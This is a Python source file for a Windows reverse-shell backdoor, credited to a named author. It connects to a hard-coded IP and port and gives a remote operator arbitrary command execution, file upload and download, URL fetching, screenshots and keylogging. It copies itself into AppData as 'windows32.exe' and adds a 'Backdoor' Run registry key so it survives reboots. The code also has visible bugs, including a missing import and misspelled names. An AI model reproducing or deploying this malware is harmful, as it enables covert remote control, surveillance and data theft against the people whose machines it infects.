#/usr/bin/python
# Written By: Sahar Hathiramani
# Date: 01/21/2021 - 1/23/2021

import socket
from termcolor import colored
import subprocess 
import json
import os
import base64
import shutil
import time
import requests
import mss
import threading
import keylogger

def reliable_send(data):
    jsonData = json.dumps(data)
    sock.send(jsonData.encode())

def reliable_recv():
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
            return json.loads(data)
        except ValueError:
            continue

def is_admin():
    global admin
    try:
        temp = os.listdir(os.sep.join([os.environ.get('SystemRoot', 'C:\windows'), 'temp']))
    except:
        admin = '[-] User Privileges'
    else:
        admin = '[+] Admin Privileges'

def screenshot():
    with mss() as screenshot:
        screenshot.shot()

def download(url): #Work in Progress
    getResponse = requests.get(url)
    fileName = url.split('/')[-1]
    with open(fileName, "wb") as outFile:
        outFile.write(getResponse.content)

def connection():
    while True:
        time.sleep(5)
        try:
            sock.connect(("192.168.7.125", 54321))
            print(colored("[+] Connection Established!", "green"))
            shell()
            sock.close()
            break
        except:
            print(colored("[-] Unable to restablish connection. Re-trying...", "red"))
            connection()

def shell():
    while True:
        command = reliable_recv()
        if command == 'exit':
            break

        elif command == "help":
            options = '''download path --> Download File from Target PC
upload path --> Upload File to Target PC
get url ---> Download File to Target PC From Any Website
start path --> Start Program on Target PC
screenshot --> Take Screenshot of Target's Monitor
admin --> Check if User has Admin Privileges
keylog start --> Start Keylogger
keylog dump --> Dump Keystrokes from Keylogger
exit --> Exit Reverse Shell''' 
            reliable_send(options)

        elif command[:2] == "cd" and len(command) > 1:
            try:
                os.chdir(command[3:])
            except:
                continue

        elif command[:8] == "download":
            with open(command[9:], "rb") as download:
                reliable_send(base64.b64encode(download.read()))

        elif command[:6] == "upload": #Work in Progress
            with open(command[7:], "wb") as upload:
                fileData = reliable_recv()
                upload.write(base64.b64decode(fileData))

        elif command[:3] == "get": #Work in Progress
            try:
                download(command[4:])
                reliable_send("[+] Downloaded File from Specified URL")
            except:
                reliable_send("[-] Failed to Download File")

        elif command[:10] == "screenshot": #Work in Progress
            try:
                screenshot()
                with open("monitor-1.png", "rb") as sc:
                    reliable_send(base64.b64encode(sc.read()))
                os.remove("monitor-1.png")
            except:
                reliable_send("[-] Failed to take Screenshot")

        elif command[:5] == "admin":
            try:
                is_admin()
                reliable_send(admin)
            except:
                reliabel_send("[-] Can't Perform Admin Check")
        
        elif command[:5] == "start":
            try:
                subprocess.Popen(command[6:], shell=True)
                reliable_send("[+] Started Process")
            except:
                reliable_send("[-] Failed to Start Process")

        elif command[:12] == "keylog start":
            t1 = Threading.Thread(target=keylogger.start)
            t1.start()

        elif command[:11] == "keylog dump":
            fn = open(keylogger_path, "r")
            reliable_send(fn.read())

        else:
            proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            result = proc.stdout.read() + proc.stderr.read()
            reliable_send(result)

keylogger_path = os.environ["appdata"] + "\\processmanager.txt"

location = os.environ["appdata"] + "\\windows32.exe"
if not os.path.exists(location):
    shutil.copyfile(sys.executable,location)
    subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "' + location + '"', shell=True)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()
sock.close()
